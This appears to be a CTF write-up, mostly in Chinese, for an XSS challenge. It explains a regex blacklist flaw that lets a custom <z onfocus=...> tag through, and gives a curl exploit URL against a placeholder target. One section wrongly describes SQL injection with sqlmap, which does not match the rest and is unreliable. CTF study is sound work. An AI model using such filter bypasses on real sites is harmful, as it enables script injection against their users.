## 题目描述

The main goal is to execute a XSS with the string 'XSS' (capital) on it. For example: alert('XSS')

## 知识点

* **Type:** Cross-Site Scripting (XSS)
* **Category:** Injection

## 解题方法思路

页面发现分类查看接口和admin登录页面，找到sql注入，使用sqlmap探测，发现flag或者登录信息，后用用户名密码登录admin

## 解题步骤

查看 `src/app.py` 中的 `xss31` 函数：

 ```python blacklist = r'<[a-yA-Y/]+' blacklisted_words = re.findall(blacklist, msg, re.IGNORECASE)```

发现正则表达式只匹配 `<` 后跟 `a` 到 `y` (或 `A` 到 `Y`) 的字符。这意味着以 `<z` 或 `<Z` 开头的标签不会被拦截。

查看 `src/check.js` 文件：

```
// Dispatch "focus" event to elements that may have "autofocus" or "onfocus" handlers
var elements = document.querySelectorAll('[autofocus], [onfocus]');
Array.prototype.forEach.call(elements, function(el) {
    var event = document.createEvent('Events');
    event.initEvent('focus', true, false);
    el.dispatchEvent(event);
});
```

### Payload 构造

由于 `<script>`、`<img>`、`<body>` 等常见标签均以 `a-y` 范围内的字母开头，无法使用。利用正则缺陷，构造自定义标签 `<z>`：

```
<z onfocus=alert('XSS')>
```

后端会将输入拼接到 `> {msg}` 之后，闭合前一个 input 标签，从而使我们的 payload 生效。

### 4. 实施攻击

将构造好的 Payload 通过 GET 请求发送给目标端点。PhantomJS 加载页面后将执行 JS，后端捕获到 `alert('XSS')` 后返回 Flag。

## exp

**注意：请将 `<TARGET_URL>` 替换为实际的目标URL，如 http://localhost:5001**

Bash

```
# 发送包含 Payload 的请求
# Payload: <z onfocus=alert('XSS')>
# URL编码后: %3Cz%20onfocus=alert('XSS')%3E

curl "<TARGET_URL>/page?name=%3Cz%20onfocus=alert('XSS')%3E"
```

**预期响应中将包含 Flag：** `Congratulations! Here is the flag: flag{...}`